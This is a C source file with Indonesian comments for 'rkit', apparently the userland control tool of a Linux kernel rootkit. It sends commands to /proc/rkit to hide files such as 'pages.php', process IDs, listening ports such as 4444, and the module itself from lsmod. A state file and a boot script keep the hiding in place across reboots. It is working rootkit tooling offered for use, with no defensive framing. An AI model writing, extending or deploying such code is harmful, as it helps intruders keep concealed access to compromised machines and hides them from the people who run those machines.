/*
 * rkit — CLI lokal userland (kontrak: control/telegram/SPEC.md §3)
 *
 * Perintah:
 *   rkit status
 *   rkit hide   <file|pid|port|mod> <nilai>   (mod: tanpa nilai)
 *   rkit unhide <file|pid|port|mod> <nilai>
 *
 * Contoh:
 *   rkit hide file pages.php
 *   rkit hide port 4444
 *   rkit hide pid 1234
 *   rkit hide mod              <- sembunyikan modul dari lsmod
 *   rkit unhide mod            <- WAJIB sebelum rmmod!
 *
 * Exit code:0 sukses,1 gagal (modul tak aktif/dst),2 pemakaian salah.
 *
 * State: hide file & port juga disimpan ke /var/lib/rkit/state agar
 * dipulihkan saat boot oleh tools/rkit-load.sh. PID tidak disimpan
 * (mati saat reboot). Menulis langsung ke /proc/rkit TIDAK menyimpan
 * state — lebih baik lewat CLI ini.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/stat.h>

#define RPROC "/proc/rkit"
#define SDIR  "/var/lib/rkit"
#define SFILE "/var/lib/rkit/state"
#define LINE  160
#define SCAP  8192

static void usage(void)
{
	fprintf(stderr,
		"pemakaian: rkit status\n"
		"           rkit <hide|unhide> <file|pid|port|mod> <nilai>\n"
		"           rkit <hide|unhide> mod\n"
		"contoh   : rkit hide file pages.php\n"
		"           rkit hide port 4444\n"
		"           rkit hide pid 1234\n"
		"           rkit unhide mod        (wajib sebelum rmmod)\n");
}

static int do_write(const char *cmd)
{
	int fd = open(RPROC, O_WRONLY);

	if (fd < 0) {
		fprintf(stderr, "gagal membuka %s: %s\n"
			"  (modul backend modern belum aktif? lihat docs/TESTING.md)\n",
			RPROC, strerror(errno));
		return 1;
	}
	if (write(fd, cmd, strlen(cmd)) < 0) {
		fprintf(stderr, "gagal perintah '%s': %s\n", cmd, strerror(errno));
		close(fd);
		return 1;
	}
	close(fd);
	return 0;
}

static int do_status(void)
{
	char buf[768];
	int fd = open(RPROC, O_RDONLY);
	ssize_t n;

	if (fd < 0) {
		fprintf(stderr, "gagal membuka %s: %s\n", RPROC, strerror(errno));
		return 1;
	}
	while ((n = read(fd, buf, sizeof(buf))) > 0)
		fwrite(buf, 1, (size_t)n, stdout);
	close(fd);
	return 0;
}

/* ---------- state: baris "kind nilai" di /var/lib/rkit/state ---------- */

static void append_line(char *dst, size_t cap, int *off, const char *s)
{
	size_t l = strlen(s);

	if (*off + (int)l + 2 >= (int)cap)
		return;
	memcpy(dst + *off, s, l);
	*off += (int)l;
	dst[(*off)++] = '\n';
}

static int state_update(const char *kind, const char *val, int add)
{
	char old[SCAP], neu[SCAP], want[LINE];
	char *ln, *save = NULL;
	int fd, off = 0;
	ssize_t n;

	/* baca state lama dulu (sebelum truncate) */
	old[0] = '\0';
	fd = open(SFILE, O_RDONLY);
	if (fd >= 0) {
		n = read(fd, old, sizeof(old) - 1);
		if (n < 0)
			n = 0;
		old[n] = '\0';
		close(fd);
	}

	if (mkdir(SDIR, 0700) != 0 && errno != EEXIST) {
		fprintf(stderr, "peringatan: %s tidak bisa dibuat (%s)\n",
			SDIR, strerror(errno));
		return 1;
	}

	snprintf(want, sizeof(want), "%s %s", kind, val);

	/* salin baris lama kecuali yang cocok persis dengan tujuan */
	for (ln = strtok_r(old, "\n", &save); ln;
	     ln = strtok_r(NULL, "\n", &save)) {
		if (strcmp(ln, want) == 0)
			continue;              /* add: sudah ada; del: buang */
		append_line(neu, sizeof(neu), &off, ln);
	}
	if (add)
		append_line(neu, sizeof(neu), &off, want);

	fd = open(SFILE, O_WRONLY | O_CREAT | O_TRUNC, 0600);
	if (fd < 0) {
		fprintf(stderr, "peringatan: state tidak bisa ditulis (%s)\n",
			strerror(errno));
		return 1;
	}
	if (off > 0 && write(fd, neu, (size_t)off) != off) {
		close(fd);
		return 1;
	}
	close(fd);
	return 0;
}

int main(int argc, char **argv)
{
	char cmd[LINE];
	const char *target, *val;
	int is_hide;

	if (argc == 2 && strcmp(argv[1], "status") == 0)
		return do_status();

	if (argc == 4 &&
	    (strcmp(argv[1], "hide") == 0 || strcmp(argv[1], "unhide") == 0)) {
		target = argv[2];
		val = argv[3];
		is_hide = (strcmp(argv[1], "hide") == 0);

		if (strcmp(target, "file") == 0)
			snprintf(cmd, sizeof(cmd), "%s %s",
				 is_hide ? "hide" : "unhide", val);
		else if (strcmp(target, "pid") == 0)
			snprintf(cmd, sizeof(cmd), "%s %s",
				 is_hide ? "hidepid" : "unhidepid", val);
		else if (strcmp(target, "port") == 0)
			snprintf(cmd, sizeof(cmd), "%s %s",
				 is_hide ? "hideport" : "unhideport", val);
		else {
			usage();
			return 2;
		}

		if (do_write(cmd) != 0)
			return 1;

		/* state hanya untuk yang punya makna lintas reboot */
		if (strcmp(target, "file") == 0)
			state_update("name", val, is_hide);
		else if (strcmp(target, "port") == 0)
			state_update("port", val, is_hide);
		return 0;
	}

	/* hide/unhide mod: tanpa nilai */
	if (argc == 3 &&
	    (strcmp(argv[1], "hide") == 0 || strcmp(argv[1], "unhide") == 0) &&
	    strcmp(argv[2], "mod") == 0) {
		return do_write(strcmp(argv[1], "hide") == 0 ? "modhide" : "modshow");
	}

	usage();
	return 2;
}
